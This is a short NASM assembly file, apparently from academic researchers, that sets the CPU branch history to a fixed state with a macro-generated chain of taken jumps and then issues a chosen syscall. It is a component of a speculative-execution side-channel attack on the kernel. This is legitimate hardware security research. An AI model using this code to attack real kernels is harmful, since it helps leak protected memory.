; Thursday, September 9th 2021
;
; Enrico Barberis - e.barberis@vu.nl
; Pietro Frigo - p.frigo@vu.nl
; Marius Muench - m.muench@vu.nl
; Herbert Bos - herbertb@cs.vu.nl
; Cristiano Giuffrida - giuffrida@cs.vu.nl
;
; Vrije Universiteit Amsterdam - Amsterdam, The Netherlands

;Must match with main.c MAX_HISTORY_SIZE !
%define MAX_HISTORY_SIZE 256

section .text

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; fill_bhb
; - rdi: syscall number
; - rsi: syscall arg1
; - rdx: syscall arg2
; - rcx:  syscall arg3
; - r8:  usr_r12
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
align 0x1000
global fixed_bhb
fixed_bhb:

    push    r12

    ;perform 128 taken jumps to fix the history
    ;this is to remove the user space exeuction from the attack
    mov     rax, 0
    %assign i 0
    %rep MAX_HISTORY_SIZE
    cmp     rax, 0
    ;align   0x10
    je      next_%+i
    next_%+i:
    %assign i i+1
    %endrep

global victim_syscall
victim_syscall:
    mov rax, rdi
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov r12, r8
    syscall

    pop     r12
    ret

